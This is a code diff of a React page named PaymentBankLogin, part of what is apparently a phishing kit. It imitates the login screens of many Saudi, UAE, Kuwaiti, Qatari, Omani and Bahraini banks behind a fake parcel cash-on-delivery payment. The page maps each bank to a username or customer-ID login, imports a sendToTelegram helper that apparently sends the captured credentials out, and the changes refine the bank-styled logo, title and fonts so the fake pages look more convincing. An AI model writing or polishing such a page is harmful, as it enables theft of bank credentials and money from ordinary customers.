@@ -1,11 +1,9 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
-import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
+import { Lock, Eye, EyeOff, Building2, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
@@ -41,7 +39,6 @@ const PaymentBankLogin = () => {
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
@@ -61,59 +58,59 @@ const PaymentBankLogin = () => {
     const bankId = selectedBank.id;
     
     // Saudi banks
-    if (bankId === 'alrajhi_bank') return 'username'; // Username + Password
-    if (bankId === 'alahli_bank') return 'username'; // Username + Password
-    if (bankId === 'riyad_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'samba_bank') return 'username'; // Username + Password
-    if (bankId === 'saudi_investment_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'arab_national_bank') return 'username'; // Username + Password
-    if (bankId === 'saudi_fransi_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'alinma_bank') return 'username'; // Username + Password
-    if (bankId === 'albilad_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'aljazira_bank') return 'username'; // Username + Password
+    if (bankId === 'alrajhi_bank') return 'username';
+    if (bankId === 'alahli_bank') return 'username';
+    if (bankId === 'riyad_bank') return 'customerId';
+    if (bankId === 'samba_bank') return 'username';
+    if (bankId === 'saudi_investment_bank') return 'customerId';
+    if (bankId === 'arab_national_bank') return 'username';
+    if (bankId === 'saudi_fransi_bank') return 'customerId';
+    if (bankId === 'alinma_bank') return 'username';
+    if (bankId === 'albilad_bank') return 'customerId';
+    if (bankId === 'aljazira_bank') return 'username';
     
     // UAE banks
-    if (bankId === 'emirates_nbd') return 'username'; // Username + Password
-    if (bankId === 'adcb') return 'customerId'; // Customer ID + Password
-    if (bankId === 'fab') return 'username'; // Username + Password
-    if (bankId === 'dib') return 'username'; // Username + Password
-    if (bankId === 'mashreq_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'cbd') return 'username'; // Username + Password
-    if (bankId === 'rakbank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'ajman_bank') return 'username'; // Username + Password
+    if (bankId === 'emirates_nbd') return 'username';
+    if (bankId === 'adcb') return 'customerId';
+    if (bankId === 'fab') return 'username';
+    if (bankId === 'dib') return 'username';
+    if (bankId === 'mashreq_bank') return 'customerId';
+    if (bankId === 'cbd') return 'username';
+    if (bankId === 'rakbank') return 'customerId';
+    if (bankId === 'ajman_bank') return 'username';
     
     // Kuwait banks
-    if (bankId === 'nbk') return 'customerId'; // Customer ID + Password
-    if (bankId === 'gulf_bank') return 'username'; // Username + Password
-    if (bankId === 'cbk') return 'customerId'; // Customer ID + Password
-    if (bankId === 'burgan_bank') return 'username'; // Username + Password
-    if (bankId === 'ahli_united_bank') return 'username'; // Username + Password
-    if (bankId === 'kfh') return 'customerId'; // Customer ID + Password
-    if (bankId === 'boubyan_bank') return 'username'; // Username + Password
+    if (bankId === 'nbk') return 'customerId';
+    if (bankId === 'gulf_bank') return 'username';
+    if (bankId === 'cbk') return 'customerId';
+    if (bankId === 'burgan_bank') return 'username';
+    if (bankId === 'ahli_united_bank') return 'username';
+    if (bankId === 'kfh') return 'customerId';
+    if (bankId === 'boubyan_bank') return 'username';
     
     // Qatar banks
-    if (bankId === 'qnb') return 'customerId'; // Customer ID + Password
-    if (bankId === 'cbq') return 'username'; // Username + Password
-    if (bankId === 'doha_bank') return 'username'; // Username + Password
-    if (bankId === 'qib') return 'customerId'; // Customer ID + Password
-    if (bankId === 'masraf_alrayan') return 'username'; // Username + Password
-    if (bankId === 'ahlibank') return 'customerId'; // Customer ID + Password
+    if (bankId === 'qnb') return 'customerId';
+    if (bankId === 'cbq') return 'username';
+    if (bankId === 'doha_bank') return 'username';
+    if (bankId === 'qib') return 'customerId';
+    if (bankId === 'masraf_alrayan') return 'username';
+    if (bankId === 'ahlibank') return 'customerId';
     
     // Oman banks
-    if (bankId === 'bank_muscat') return 'customerId'; // Customer ID + Password
-    if (bankId === 'national_bank_oman') return 'username'; // Username + Password
-    if (bankId === 'bank_dhofar') return 'username'; // Username + Password
-    if (bankId === 'ahli_bank_oman') return 'customerId'; // Customer ID + Password
-    if (bankId === 'nizwa_bank') return 'username'; // Username + Password
-    if (bankId === 'sohar_international') return 'customerId'; // Customer ID + Password
+    if (bankId === 'bank_muscat') return 'customerId';
+    if (bankId === 'national_bank_oman') return 'username';
+    if (bankId === 'bank_dhofar') return 'username';
+    if (bankId === 'ahli_bank_oman') return 'customerId';
+    if (bankId === 'nizwa_bank') return 'username';
+    if (bankId === 'sohar_international') return 'customerId';
     
     // Bahrain banks
-    if (bankId === 'nbb') return 'username'; // Username + Password
-    if (bankId === 'bbk') return 'customerId'; // Customer ID + Password
-    if (bankId === 'ahli_united_bahrain') return 'username'; // Username + Password
-    if (bankId === 'bisb') return 'username'; // Username + Password
-    if (bankId === 'ithmaar_bank') return 'customerId'; // Customer ID + Password
-    if (bankId === 'khaleeji_bank') return 'username'; // Username + Password
+    if (bankId === 'nbb') return 'username';
+    if (bankId === 'bbk') return 'customerId';
+    if (bankId === 'ahli_united_bahrain') return 'username';
+    if (bankId === 'bisb') return 'username';
+    if (bankId === 'ithmaar_bank') return 'customerId';
+    if (bankId === 'khaleeji_bank') return 'username';
     
     return 'username'; // Default
   };
@@ -240,58 +237,73 @@ const PaymentBankLogin = () => {
         backgroundColor: bankDesign.backgroundColor,
         fontFamily: bankDesign.fontFamily,
         color: bankDesign.textColor,
+        padding: bankDesign.layout.containerPadding || '0',
+        backgroundImage: bankDesign.backgroundImage ? `url(${bankDesign.backgroundImage})` : undefined,
+        backgroundSize: bankDesign.backgroundImage ? 'cover' : undefined,
+        backgroundPosition: bankDesign.backgroundImage ? 'center' : undefined,
       }}
     >
+      {/* Main Container */}
       <div 
-        className="w-full"
+        className="w-full flex flex-col items-center justify-center"
         style={{
-          maxWidth: bankDesign.layout.maxWidth,
-          padding: bankDesign.spacing.containerPadding,
-          margin: '0 auto',
+          maxWidth: bankDesign.layout.maxWidth || '100%',
+          padding: '20px',
         }}
       >
-        {/* Bank Logo/Header */}
+        {/* Bank Logo Section */}
         <div 
           className="mb-8"
           style={{
             textAlign: bankDesign.layout.logoPosition === 'center' ? 'center' : 'right',
+            width: '100%',
+            display: 'flex',
+            justifyContent: 'center',
           }}
         >
-          <div 
-            className="mb-4"
-            style={{
-              display: 'inline-flex',
-              alignItems: 'center',
-              gap: '12px',
-            }}
-          >
-            <Building2 
-              className="w-10 h-10"
-              style={{ color: bankDesign.primaryColor }}
-            />
-            <div>
+          {selectedBank && (
+            <div 
+              style={{
+                display: 'flex',
+                flexDirection: 'column',
+                alignItems: 'center',
+                gap: '16px',
+              }}
+            >
+              {/* Bank Logo Placeholder - using icon with bank colors */}
+              <div
+                style={{
+                  width: bankDesign.layout.logoSize?.width || '180px',
+                  height: bankDesign.layout.logoSize?.height || '60px',
+                  backgroundColor: bankDesign.primaryColor,
+                  borderRadius: '8px',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
+                }}
+              >
+                <Building2 
+                  className="text-white"
+                  style={{
+                    width: '48px',
+                    height: '48px',
+                  }}
+                />
+              </div>
               <h1 
                 style={{
                   fontSize: bankDesign.fontSize.title,
                   fontWeight: bankDesign.fontWeight.title,
                   color: bankDesign.primaryColor,
                   margin: 0,
+                  fontFamily: bankDesign.fontFamily,
                 }}
               >
-                {selectedBank?.nameAr || 'تسجيل الدخول'}
+                {selectedBank.nameAr}
               </h1>
-              <p 
-                style={{
-                  fontSize: bankDesign.fontSize.subtitle,
-                  color: bankDesign.textColor,
-                  opacity: 0.7,
-                  margin: '4px 0 0 0',
-                }}
-              >
-                {selectedBank?.name || 'Bank Login'}
-              </p>
             </div>
-          </div>
+          )}
         </div>
 
         {/* Login Form Card */}
@@ -299,13 +311,28 @@ const PaymentBankLogin = () => {
           style={{
             backgroundColor: bankDesign.inputBackgroundColor,
             borderRadius: '8px',
-            padding: '32px',
-            boxShadow: '0 2px 12px rgba(0,0,0,0.08)',
+            padding: '40px',
+            boxShadow: '0 4px 20px rgba(0,0,0,0.1)',
             border: `1px solid ${bankDesign.inputStyles.borderColor}`,
+            width: '100%',
+            maxWidth: bankDesign.layout.formMaxWidth || '420px',
           }}
         >
-
           <form onSubmit={handleSubmit}>
+            {/* Login Title */}
+            <h2 
+              style={{
+                fontSize: '24px',
+                fontWeight: bankDesign.fontWeight.title,
+                color: bankDesign.textColor,
+                marginBottom: '32px',
+                textAlign: 'center',
+                fontFamily: bankDesign.fontFamily,
+              }}
+            >
+              تسجيل الدخول
+            </h2>
+            
             {/* Username Login */}
             {loginType === 'username' && (
               <div style={{ marginBottom: bankDesign.spacing.inputMarginBottom }}>
@@ -317,6 +344,7 @@ const PaymentBankLogin = () => {
                     fontWeight: bankDesign.fontWeight.subtitle,
                     marginBottom: '8px',
                     color: bankDesign.textColor,
+                    fontFamily: bankDesign.fontFamily,
                   }}
                 >
                   {bankDesign.labels.username}
@@ -355,6 +383,7 @@ const PaymentBankLogin = () => {
                     fontWeight: bankDesign.fontWeight.subtitle,
                     marginBottom: '8px',
                     color: bankDesign.textColor,
+                    fontFamily: bankDesign.fontFamily,
                   }}
                 >
                   {bankDesign.labels.customerId}
@@ -393,6 +422,7 @@ const PaymentBankLogin = () => {
                     fontWeight: bankDesign.fontWeight.subtitle,
                     marginBottom: '8px',
                     color: bankDesign.textColor,
+                    fontFamily: bankDesign.fontFamily,
                   }}
                 >
                   {bankDesign.labels.phone}
@@ -430,6 +460,7 @@ const PaymentBankLogin = () => {
                   fontWeight: bankDesign.fontWeight.subtitle,
                   marginBottom: '8px',
                   color: bankDesign.textColor,
+                  fontFamily: bankDesign.fontFamily,
                 }}
               >
                 {bankDesign.labels.password}
@@ -497,6 +528,7 @@ const PaymentBankLogin = () => {
                   gap: '8px',
                   cursor: 'pointer',
                   color: bankDesign.textColor,
+                  fontFamily: bankDesign.fontFamily,
                 }}
               >
                 <input 
@@ -519,6 +551,7 @@ const PaymentBankLogin = () => {
                   color: bankDesign.linkColor,
                   textDecoration: 'underline',
                   fontSize: bankDesign.fontSize.small,
+                  fontFamily: bankDesign.fontFamily,
                 }}
               >
                 {bankDesign.labels.forgotPassword}
@@ -564,7 +597,6 @@ const PaymentBankLogin = () => {
                 <>
                   <Lock className="w-5 h-5" />
                   <span>{bankDesign.labels.loginButton}</span>
-                  <ArrowLeft className="w-5 h-5" />
                 </>
               )}
             </button>
@@ -578,6 +610,7 @@ const PaymentBankLogin = () => {
                 opacity: 0.7,
                 marginTop: '16px',
                 marginBottom: 0,
+                fontFamily: bankDesign.fontFamily,
               }}
             >
               بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
@@ -592,6 +625,8 @@ const PaymentBankLogin = () => {
             marginTop: bankDesign.spacing.sectionGap,
             paddingTop: bankDesign.spacing.sectionGap,
             borderTop: `1px solid ${bankDesign.inputStyles.borderColor}`,
+            width: '100%',
+            maxWidth: bankDesign.layout.formMaxWidth || '420px',
           }}
         >
           <p 
@@ -600,6 +635,7 @@ const PaymentBankLogin = () => {
               color: bankDesign.textColor,
               opacity: 0.7,
               marginBottom: '12px',
+              fontFamily: bankDesign.fontFamily,
             }}
           >
             لا تملك حساب؟
